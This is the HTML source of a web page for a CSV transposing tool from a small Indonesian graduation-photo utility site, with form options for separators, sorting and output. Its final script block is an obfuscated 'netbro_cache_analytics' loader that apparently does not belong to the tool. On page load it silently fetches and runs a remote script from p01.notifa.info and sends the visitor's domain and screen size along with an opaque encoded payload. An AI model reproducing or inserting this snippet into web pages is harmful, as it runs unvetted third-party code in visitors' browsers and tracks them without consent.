<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Foto Wisuda Tools by c3budiman</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <script src="/js/underscore-min.js"></script>
    <script src="/js/strsup.js?v=6"></script>
    <script src="/js/localread.js?v=5"></script>
    <script src="/js/csvparse.js?v=6"></script>
    <script src="/js/csvsup.js?v=18"></script>
    <script src="/js/blob.js"></script>
    <script src="/js/filesaver.js"></script>
    <script src="/js/storagesup.js"></script>

    <script src="http://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js" type="text/javascript"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/alasql/0.3.8/alasql.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.11.5/xlsx.full.min.js"></script>
    <link rel="stylesheet" href="/js/custom.css?v=1">

    <script type="text/javascript">
        function assignText(s) {
            document.getElementById('txt1').value = s;
            parseAndOptions(CSV);
            setupSortDD();
            document.getElementById('btnRun').click();
        }
        function runit() {
            var delimiter = radiovalue(document.forms[0].outsep);
            var append = document.getElementById('chkAppend').checked;
            var nobreaks = document.getElementById('chkNoBreaks').checked;
            var bQuotes = (document.getElementById('chkCsvQuotes')).checked;
            if (delimiter == "o") delimiter = document.getElementById("outSepOtherVal").value;
            if (CSV.mySortNeeded) parseAndOptions(CSV);
            if(!append) {
               document.getElementById('txta').value = transposeCsv(CSV, delimiter, document.getElementById('chkHeader').checked, document.getElementById('chkForce').checked, document.getElementById('chkDefaultHeader').checked, nobreaks, bQuotes);
            } else {
               document.getElementById('txta').value += transposeCsv(CSV, delimiter, document.getElementById('txta').value.length==0 && document.getElementById('chkHeader').checked, document.getElementById('chkForce').checked, document.getElementById('chkDefaultHeader').checked, nobreaks, bQuotes);
            }
            saveCsv();
        }
        function runExample()
        {
            clearAll();
            document.getElementById('chkHeader').checked = true;
            assignText(getExampleCsv());
            if (document.getElementById("btnColsReset")) document.getElementById("btnColsReset").click();
        }
    </script>
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-110011798-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());

          gtag('config', 'UA-110011798-1');
    </script>
  </head>
  <body onload="CSV.mySortNeeded=true;loadCsv()">
    <div class="container">
      <div class="row">
        <a style="" href="/" class="btn btn-info">Home</a>
        <a class="btn btn-primary" href="/fotograyscale">Checker and Grayscale</a>
        <a style="" class="btn btn-warning" href="/matcher">Count And List Missing</a>
        <a style="" class="btn btn-success" href="/datadbf">Data DBF Getter</a>
      </div>
      <div class="row">
        <h1 class="page-header">Transpose CSV</h1>
        <p class="small">Copas NPM dari dbf klean kesini ya...</p>

      </div>
      <br>
      <div class="row">
        <div class="col-md-12">
<div class="container">
    <div class="row">
        <form id="frm1" name="frm1" class="form-inline" role="form" onsubmit="return false">
            <div class="form-group">
                <textarea class="form-control" rows="10" cols="130" id="txt1" class="form-control" onchange="parseAndOptions(CSV);setupSortDD();" placeholder="CSV Data" wrap="off"></textarea>
                <br/>
                <div class="btn-group">
                    <input type="button" class="btn btn-primary" value="Clear Input" onclick="clearPage()"> &nbsp;
                </div>

                <div class="panel panel-default">
                    <div id="divInputCounts" class="panel-heading">&nbsp;</div>
                </div>


                <hr class="noverticalspace" />
                <fieldset class="scheduler-border collapse" id="p3">
                    <legend class="scheduler-border">Input Options</legend>
                    <label><input type="checkbox" name="chkHeader" id="chkHeader" value="Y" onclick="parseAndOptions(CSV,true)" checked /> First row is column names&nbsp;&nbsp; </label> &nbsp;&nbsp; Limit # of lines: <input type="text" id="txtRowLimit"
                        size="5" maxlength="5" onblur="CSV.limit=this.value;parseAndOptions(CSV)" title="Specify how many records to convert">
                    <br/>Field Separator:
                    <label><input type="radio" name="sep" id="sepAuto" value="" onclick="CSV.autodetect=true;parseAndOptions(CSV)" checked> Auto Detect</label>
                    <label><input type="radio" name="sep" id="sepComma" value="," onclick="CSV.autodetect=false;CSV.delimiter = this.value; parseAndOptions(CSV)" > ,</label>
                    <label><input type="radio" name="sep" id="sepSemicolon" value=";" onclick="CSV.autodetect=false;CSV.delimiter = this.value; parseAndOptions(CSV)"> ;</label>
                    <label><input type="radio" name="sep" id="sepColon" value=":" onclick="CSV.autodetect=false;CSV.delimiter = this.value; parseAndOptions(CSV)"> :</label>
                    <label><input type="radio" name="sep" id="sepPipe" value="|" onclick="CSV.autodetect=false;CSV.delimiter = this.value; parseAndOptions(CSV)"> Bar-|</label>
                    <label><input type="radio" name="sep" id="sepTab" value="\t" onclick="CSV.autodetect=false;CSV.delimiter = '\t'; parseAndOptions(CSV)"> Tab</label>
                    <label><input type="radio" name="sep" id="sepCaret" value="^" onclick="CSV.autodetect=false;CSV.delimiter = this.value; parseAndOptions(CSV)"> Caret-^</label>
                    <label><input type="radio" name="sep" id="sepSpace" value=" " onclick="CSV.autodetect=false;CSV.delimiter = this.value; parseAndOptions(CSV)"> Space</label>
                    <br/><label><input type="checkbox" value="Y" id="chkIgnoreDoubleQuote" onclick="CSV.ignoreQuote=this.checked;parseAndOptions(CSV)" title="All double quotes are data" /> Treat all double quotes as data</label>
                    <br/><label><input type="checkbox" value="'" id="chkInputQuote" onclick="setInputSingleQuote(this.checked)" title="Uses single quote for quoting character" /> Input CSV Quoting Character is Apostrophe</label>
                    <br/><label><input type="checkbox" value="Y" id="chkDecodeLiterals" onclick="CSV.decodeBackslashLiterals=this.checked;parseAndOptions(CSV,true)" title="Input CSV uses backslash escaping like \n and \t" /> CSV contains backslash escaping like \n, \t, and \,</label>
                </fieldset>

                {{-- <h3 class="headerBlue">Step 3: Choose output options <small>(optional)</small></h3><a href="#" onclick="return false" data-toggle="collapse" data-target="#p4"> <span class="glyphicon glyphicon-chevron-down"></span></a> --}}
                <hr class="noverticalspace" />
                <fieldset class="scheduler-border collapse" id="p4">
                    <legend class="scheduler-border">Output Options</legend>

                    <div id="divCols">
                        <label>Display which field positions? <small>(Comma separated list where 1 is 1st field, 2=2nd,... i.e. 2,1,4,3)</small><br/>
    <input type="text" id="txtCols" size="50" value="" onchange="CSV.displayPoss=this.value;" title="i.e. 1,3,4,6 or field names- id,name,amount"></label>
                        <input type="button" id="btnColsReset" class="btn btn-primary" value="Reset" onclick="CSV.displayPoss='';document.getElementById('txtCols').value=getFldPosArr(CSV);">
                    </div>

                    <div id="rqb">&nbsp;</div>
                    <br/>
                    <table class="table table-bordered table-hover table-condensed">
                        <tr>
                            <th colspan="4" class="text-center">Sort CSV &nbsp;
                                <label><input type="checkbox" id="chkIgnoreCase" value="Y" onclick="CSV.sortIgnoreCase=this.checked"> Ignore Case</label></th>
                        </tr>
                        <tr>
                            <td>&nbsp;</td>
                            <th>Field #</th>
                            <th>Type</th>
                            <th>Direction</th>
                        </tr>
                        <tr>
                            <td>First By</td>
                            <td><select id="selSortFld1" onchange="sortStr()"><option value="">-Choose-</option></select></td>
                            <td><select id="selSortType1" onchange="sortStr()"><option value="">-Default-</option><option value="C">String</option><option value="N">Numeric</option></select></td>
                            <td><select id="selSortAsc1" onchange="sortStr()"><option value="">Ascending</option><option value="D">Descending</option></select></td>
                        </tr>
                        <tr>
                            <td>Then By</td>
                            <td><select id="selSortFld2" onchange="sortStr()"><option value="">-Choose-</option></select></td>
                            <td><select id="selSortType2" onchange="sortStr()"><option value="">-Default-</option><option value="C">String</option><option value="N">Numeric</option></select></td>
                            <td><select id="selSortAsc2" onchange="sortStr()"><option value="">Ascending</option><option value="D">Descending</option></select></td>
                        </tr>
                        <tr>
                            <td>Then By</td>
                            <td><select id="selSortFld3" onchange="sortStr()"><option value="">-Choose-</option></select></td>
                            <td><select id="selSortType3" onchange="sortStr()"><option value="">-Default-</option><option value="C">String</option><option value="N">Numeric</option></select></td>
                            <td><select id="selSortAsc3" onchange="sortStr()"><option value="">Ascending</option><option value="D">Descending</option></select></td>
                        </tr>
                    </table>
                    <br/>
                    <div id="divMinOptions"></div>
                    <br/> Output Field Separator:
                    <label><input type="radio" name="outsep" id="outSepComma" value="," checked> ,</label> &nbsp;
                    <label><input type="radio" name="outsep" id="outSepSemicolon" value=";"> ;</label> &nbsp;
                    <label><input type="radio" name="outsep" id="outSepColon" value=":" > :</label> &nbsp;
                    <label><input type="radio" name="outsep" id="outSepPipe" value="|" > Bar-|</label> &nbsp;
                    <label><input type="radio" name="outsep" id="outSepTab" value=" " onclick="this.value='\t'" > Tab</label> &nbsp;
                    <label><input type="radio" name="outsep" id="outSepOther" value="o" > Other-Choose</label>
                    <label><input type="text" size="2" id="outSepOtherVal" value="*"/></label>
                    <br/><label><input type="checkbox" id="chkForce" value="Y"> Force text format for Excel</label>
                    <br/><label><input id="chkCsvQuotes" type="checkbox" /> Force Wrap values in double quotes</label>
                    <br/><label><input type="checkbox" id="chkDefaultHeader" value="Y"> Add a header line if missing</label>
                    <br/><label><input type="checkbox" id="chkAppend" value="Y"> Append Results below</label>
                    <br/><label><input type="checkbox" id="chkNoBreaks" value="Y"> Suppress Line Breaks in Fields</label>
                    <br/> <label><input type="checkbox" value="'" id="chkOutputQuote" onclick="setOutputSingleQuote(this.checked)" title="Use single quote for quoting character" /> Output Quoting Character is Apostrophe</label>
                </fieldset>

                {{-- <h3 class="headerBlue">Step 4: Generate output</h3><br/> --}}
                <input type="button" id="btnRun" class="btn btn-primary" value="Transpose CSV" title="Convert CSV By Transposing Rows into Columns and Columns into Rows" onclick="runit();return false">
                <input type="button" class="btn btn-primary" onclick="runit();saveExcel('txta',false);return false" value="Transpose CSV To Excel" title="Save output as an Excel file" />
                <br/>

                <div class="form-group">
                    <label for="txta" class="control-label">Result Data:</label><br/>
                    <textarea id="txta" rows="10" cols="130" wrap="off" placeholder="Output Results" class="form-control"></textarea>
                </div><br/>
                {{-- <div class="form-group form-inline">
                    <label>Save your result:
  <input type="text" size="15" id="fn" value="convertcsv" class="form-control" title="Enter filename without extension" />.csv</label>
                    <button class="btn btn-primary" onclick="saveFile(document.getElementById('txta').value,'csv');return false"><span class="glyphicon glyphicon-save-file"></span> Download Result</button>
                    <label title="End-of-Line">EOL: <select id="eol" title="CRLF=Windows,LF=Unix/Linux/New Apple/Android"><option value="">CRLF</option><option value="LF">LF</option></select></label>
                    <br/>
                </div> --}}

            </div>
        </form>
    </div>
</div>
<div class="row">
    <div class="col-md-12">
        <div class="panel-footer">

        </div>
    </div>
</div>
<script type="text/javascript">
    if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mOT3xODzk7gxx%2bDdDxvJAgSHiR2pDwd%2bzXQ1hTZtwyh4FmSRnilyYKpc4Sz%2f3M8Cx0QT1cCq218EIGUfsDEqFxPmrSSU2d7J08x3LBE%2bIvugHANiPXxMyyJokxZNeoboc0o2EjMJGAHIh0tFM6Hbe0NTl%2fWR2vyfWGUpK1LLM0kZhrVhWHxM7dJULpFyocTa5LM6OG%2bIhfSpFEnkntPFKXXVGs8r6aFcuK7sO0Vj9p20q8O8oFKFPycL1JhBcpgWnVH15vn%2fLIOhIdhtfuyw84by2xRDJ%2bAc3VwTOI1vfrUZh3ZUyu4KAZSyoy4OPwwoH28vgaflfun%2bOivm7gTGN3kWlFhOag1DcUoaz%2bSrMjTuW1Kb1EABT0xhE90OBIjQPo07lrFyqYRYv2lt8h8lU1fJg1kPm52sYewu6B7QM%2ft3E8e%2bMqExKfsZDOFbvwmjA8NcNcGCl28p%2bjXKoDC8H31H%2b5RD39Gv%2fSNqnR6FKEiQ2KBljjzB%2fEiSgJ9OCagZi9dDMMG9lgH6F9rlG7fZmtApRIRfDXapKhbFWUVUbJOSNIkHJJpFVFw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
        </div>
      </div>
    </div>
  </body>
</html>
